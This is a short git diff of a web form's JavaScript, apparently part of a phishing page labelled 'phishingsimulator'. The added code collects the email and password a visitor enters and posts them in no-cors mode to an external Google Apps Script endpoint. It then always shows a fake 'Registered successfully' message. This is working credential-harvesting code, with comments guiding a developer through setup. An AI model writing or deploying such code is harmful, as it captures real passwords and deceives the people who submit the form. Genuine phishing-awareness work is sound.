@@ -433,28 +433,24 @@
     };
 
     try {
-      const response = await fetch(
-        "https://script.google.com/macros/s/AKfycbxntk7kNMq8x8uNP-QSVbfyi69DtjKgyR_4as1Qw_Hvhjo5ZDodnLDasVjZQ2FAP5c/exec", 
-        // ↑ 🔴 PASTE YOUR DEPLOYED APPS SCRIPT URL HERE
-        // Example: https://script.google.com/macros/s/AKfycbxxxxxxx/exec
+      const formData = new FormData();
+      formData.append("email", document.getElementById('email').value);
+      formData.append("password", document.getElementById('password').value);
+      formData.append("key", "phishingsimulator");
 
+      await fetch(
+        "https://script.google.com/macros/s/AKfycbxntk7kNMq8x8uNP-QSVbfyi69DtjKgyR_4as1Qw_Hvhjo5ZDodnLDasVjZQ2FAP5c/exec",
         {
           method: "POST",
           mode: "no-cors",
-          body: JSON.stringify(formData),
-          headers: {
-            "Content-Type": "application/json"
-          }
+          body: formData
+          // ❌ REMOVE headers completely
         }
       );
 
-      if (response.ok) {
-        msg.textContent = "Registered successfully! Redirecting...";
-      } else {
-        msg.textContent = "Submission failed.";
-      }
+      msg.textContent = "Registered successfully! Redirecting...";
 
-    } catch(err) {
+    } catch (err) {
       console.error("Error:", err);
       msg.textContent = "Network error.";
     }
